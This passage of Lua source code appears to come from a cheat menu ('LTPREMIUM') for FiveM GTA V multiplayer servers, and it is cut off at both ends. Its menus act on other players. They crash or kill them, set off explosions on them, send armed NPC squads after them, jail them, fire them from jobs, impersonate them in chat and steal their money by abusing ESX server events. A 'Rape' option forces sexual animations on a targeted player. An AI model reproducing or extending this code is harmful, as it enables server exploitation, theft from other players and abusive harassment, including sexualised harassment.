				 RequestModel(model3)
     while not HasModelLoaded(model3) do
        Wait(100)
    end

    SetPlayerModel(player3, model3)
	SetPedDefaultComponentVariation(GetPlayerPed(-1))
    SetModelAsNoLongerNeeded(model3)
	elseif LTPREMIUM.Button("Change To ~y~Trevor") then
			Deer.Destroy()
		Wait(100)
				local model13 = GetHashKey("player_two")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model13)
    while not HasModelLoaded(model13) do
        Wait(100)
    end

    SetPlayerModel(player1, model13)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
	elseif LTPREMIUM.Button("Change To ~b~Michael") then
			Deer.Destroy()
		Wait(100)
				local model12 = GetHashKey("player_zero")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model12)
    while not HasModelLoaded(model12) do
        Wait(100)
    end

    SetPlayerModel(player1, model12)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model12)
	elseif LTPREMIUM.Button("Change To ~g~Franklin") then
			Deer.Destroy()
		Wait(100)
				local model11 = GetHashKey("player_one")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model11)
    while not HasModelLoaded(model11) do
        Wait(100)
    end

    SetPlayerModel(player1, model11)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model11)
	elseif LTPREMIUM.Button("Change To ~r~Alien") then
			Deer.Destroy()
		Wait(100)
				local model121 = GetHashKey("s_m_m_movalien_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model121)
    while not HasModelLoaded(model121) do
        Wait(100)
    end

    SetPlayerModel(player1, model121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model121)
	elseif LTPREMIUM.Button("Change To ~h~Bigfoot") then
			Deer.Destroy()
		Wait(100)
				local model122 = GetHashKey("ig_orleans")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model122)
    while not HasModelLoaded(model122) do
        Wait(100)
    end

    SetPlayerModel(player1, model122)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model122)
	elseif LTPREMIUM.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
    TriggerEvent('esx_skin:openSaveableMenu')
	end
	LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and LTPREMIUM.MenuButton("~r~→  ~s~Name: "..GetPlayerName(i).." | ID: "..GetPlayerServerId(i).." | "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~Dead ~s~|" or "~g~Alive ~s~|"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    LTPREMIUM.Display()
                elseif LTPREMIUM.IsMenuOpened("PlayerOptionsMenu") then
                    LTPREMIUM.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if LTPREMIUM.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif LTPREMIUM.Button('~g~Heal ~s~Player') then
                    local dU = 'PICKUP_HEALTH_STANDARD'
                    local dV = GetHashKey(dU)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif LTPREMIUM.Button('~b~Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif LTPREMIUM.Button('~b~FULL Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(-1000)
                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                        SetPickupRegenerationTime(pickup, 10)
                        i = i + 1
                    end
                elseif LTPREMIUM.Button("~w~[QB] [ESX]Open ~b~Inventory") then
                    TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
					elseif LTPREMIUM.Button("Teleport To Player With Vehicle") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    elseif cP == 'n' then
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    else
                        drawNotification(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
                    elseif LTPREMIUM.Button("Teleport To Player") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    elseif cP == 'n' then
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    else
                        drawNotification(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
					elseif LTPREMIUM.Button("~g~Give ~w~Money") then
						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
						if result then
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
                    elseif LTPREMIUM.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif LTPREMIUM.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then
                    elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Options", "PlayerESXMenu") then
                    elseif LTPREMIUM.MenuButton("~r~→  ~s~Choose weapon", "SingleWepPlayer") then
                    elseif LTPREMIUM.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif LTPREMIUM.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, false)
                        end
                    elseif LTPREMIUM.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif LTPREMIUM.Button("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)

                        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                            RequestModel(ModelName)
                            while not HasModelLoaded(ModelName) do
                                Citizen.Wait(-1000)
                            end

                            local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                            drawNotification("~g~Vehicle Given To Player!")
                        else
                            drawNotification("~r~Model is not valid!")
                        end
					elseif LTPREMIUM.Button('Clone Car') then
                    ClonePedVeh()
					elseif LTPREMIUM.Button('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = true
                    local target = GetPlayerPed(SelectedPlayer)
                    local assped = nil
                    local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
                    local veh = vehlist[math.random(#vehlist)]
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('s_m_y_hwaycop_01')
                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
                        RequestModel('s_m_y_hwaycop_01')
                        Citizen.Wait(-1000)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        v1 =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10) + 2,
                            pos.y - (yf * 10) + 2,
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        SetVehicleGravityAmount(v, 15.0)
                        SetVehicleGravityAmount(v1, 15.0)
                        SetEntityInvincible(v, true)
                        SetEntityInvincible(v1, true)
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('s_m_y_hwaycop_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('s_m_y_hwaycop_01') then
                                Citizen.Wait(50)
                                local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                assped = ped
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v1, -1)
                                    SetPedIntoVehicle(pas, v, 0)
                                    SetPedIntoVehicle(pas1, v1, 0)
                                    TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    asstarget = target
                                    TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    SetDriverAbility(ped, 10.0)
                                    SetDriverAggressiveness(ped, 10.0)
                                    SetDriverAbility(ped1, 10.0)
                                    SetDriverAggressiveness(ped1, 10.0)
                                end
                            end
                        end
                    end
                end)
                    elseif LTPREMIUM.Button("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        drawNotification("~g~Kicked Player From Vehicle!")
					elseif LTPREMIUM.Button("Kill Player") then
					SetEntityHealth(GetPlayerPed(SelectedPlayer), 0)
					SetEntityHealth(GetPlayerPedId(SelectedPlayer), 0)
                    elseif LTPREMIUM.Button("Spawn Flare On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
                    elseif LTPREMIUM.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), true, true, 100)
                    end

                    LTPREMIUM.Display()
                elseif LTPREMIUM.IsMenuOpened("PlayerESXMenu") then
                    if LTPREMIUM.MenuButton("~r~→  ~s~ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Jobs", "PlayerESXJobMenu") then
                    end

                    LTPREMIUM.Display()
                elseif LTPREMIUM.IsMenuOpened("PlayerESXTriggerMenu") then
                    if LTPREMIUM.Button("ESX Revive") then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer),GetPlayerServerId(selectedPlayer))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
					local ax = GetPlayerPed(SelectedPlayer)
                    local bK = GetEntityCoords(ax)
                    TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                    local dZ = {
                        x = ESX.Math.Round(bK.x, 1),
                        y = ESX.Math.Round(bK.y, 1),
                        z = ESX.Math.Round(bK.z, 1)
                    }
                    StopScreenEffect('DeathFailOut')
                    DoScreenFadeIn(800)
					elseif LTPREMIUM.Button("Fire player from job (~g~ESX~s~)") then
				    FirePlayer(SelectedPlayer)
                    elseif LTPREMIUM.Button("ESX Give Money To Player From Your Wallet") then
                        local d = KeyboardInput("Enter amount of money to give","",100)
                        if d ~= "" then
                            TriggerServerEvent("esx:giveInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif LTPREMIUM.Button("ESX Steal Money From Player") then
                        local d=KeyboardInput("Enter amount of money to steal","",100)
                        if d ~= "" then
                            TriggerServerEvent("esx:removeInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif LTPREMIUM.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif LTPREMIUM.Button("ESX Send To Jail") then
                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
                           TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                           TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                        TriggerServerEvent("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
                    elseif LTPREMIUM.Button("ESX Get Out Of Jail") then
                        local ped = selectedPlayer
                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                        TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                        TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
                        TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                    end

                    LTPREMIUM.Display()
                elseif LTPREMIUM.IsMenuOpened("PlayerESXJobMenu") then
                    if LTPREMIUM.Button("Unemployed") then
                        TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
                    elseif LTPREMIUM.Button("Police") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"police",3)
                    elseif LTPREMIUM.Button("Mechanic") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"mecano",3)
                    elseif LTPREMIUM.Button("Taxi") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"taxi",3)
                    elseif LTPREMIUM.Button("Ambulance") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"ambulance",3)
                    elseif LTPREMIUM.Button("Real Estate Agent") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"realestateagent",3)
                    elseif LTPREMIUM.Button("Car Dealer") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"cardealer",3)
                    end


                    LTPREMIUM.Display()
                elseif LTPREMIUM.IsMenuOpened("PlayerTrollMenu") then
                    if LTPREMIUM.Button ("Fake Chat Message") then
                        local cX=KeyboardInput("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
				elseif LTPREMIUM.Button("Ram w/ Custom Vehicle") then
				local cPs = KeyboardInput('Are you sure you want to ram the player? y/n', '', 0)
				if cPs == 'y' then
						local ModelName1 = KeyboardInput("Enter Vehicle Name", "", 100)
				        if ModelName1 and IsModelValid(ModelName1) and IsModelAVehicle(ModelName1) then
                        local model = GetHashKey(ModelName1)
                        RequestModel(model)
                        while not HasModelLoaded(model) do
                            Citizen.Wait(-1000)
                        end
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                            SetVehicleForwardSpeed(veh, 120.0)		
                        end		
											                    else
                        drawNotification("~r~Model Isn't Valid You Tard")
						end
						elseif cPs == 'n' then
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
					    else
                        drawNotification(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
				elseif LTPREMIUM.Button('~y~Explode ~s~Vehicle') then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', false)
                    end
                elseif LTPREMIUM.Button('~r~Banana ~p~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        bH,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bI,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bJ,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif LTPREMIUM.Button('~r~ISIS Explode') then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
				elseif LTPREMIUM.Button("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                elseif LTPREMIUM.Button('~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(-1000)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                        while not NetworkHasControlOfEntity(veh) do
                            NetworkRequestControlOfEntity(veh)
                            Citizen.Wait(-1000)
                        end
                        SetEntityAsMissionEntity(veh, true, true)
                        DeleteVehicle(veh)
                        DeleteEntity(veh)
                    end
                    count = -0.2
                    for b = 1, 3 do
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                        SetEntityAsMissionEntity(bS, true, true)
                        AttachEntityToEntity(
                            bS,
                            GetPlayerPed(SelectedPlayer),
                            4103,
                            11816,
                            count,
                            0.00,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            false,
                            false,
                            false,
                            false,
                            2,
                            true
                        )
                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
                        TaskPlayAnim(
                            GetPlayerPed(SelectedPlayer),
                            'rcmpaparazzo_2',
                            'shag_loop_poppy',
                            2.0,
                            2.5,
                            -1,
                            49,
                            0,
                            0,
                            0,
                            0
                        )
                        SetPedKeepTask(bS)
                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        SetEntityInvincible(bS, true)
                        count = count - 0.4
                    end
                elseif LTPREMIUM.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(-1000)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif LTPREMIUM.Button('Wall ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif LTPREMIUM.Button('Wall ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif LTPREMIUM.Button('Fuck Up ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local ee = 'sr_prop_spec_tube_xxs_01a'
                    local ef = GetHashKey(ee)
                    RequestModel(ef)
                    RequestModel(smashhash)
                    while not HasModelLoaded(ef) do
                        Citizen.Wait(-1000)
                    end
                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false)
                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
                    local eh = -356333586
                    local bR = 'WEAPON_SNOWBALL'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(eg)
                        RequestModel(eh)
                        Citizen.Wait(50)
                        if HasModelLoaded(eh) then
                            local ped =
                                CreatePed(
                                21,
                                eh,
                                bK.x + math.sin(i * 2.0),
                                bK.y - math.sin(i * 2.0),
                                bK.z - 5.0,
                                0,
                                true,
                                true
                            ) and
                                CreatePed(
                                    21,
                                    eh,
                                    bK.x - math.sin(i * 2.0),
                                    bK.y + math.sin(i * 2.0),
                                    bK.z - 5.0,
                                    0,
                                    true,
                                    true
                                )
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(-1000)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetCurrentPedWeapon(ped, GetHashKey(bR), true)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(-1000)
                            end
                        end
                    end
				elseif LTPREMIUM.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(-1000)
                            end
                        end
                    end
                elseif LTPREMIUM.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(-1000)
                            end
                        end
                    end
					elseif LTPREMIUM.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
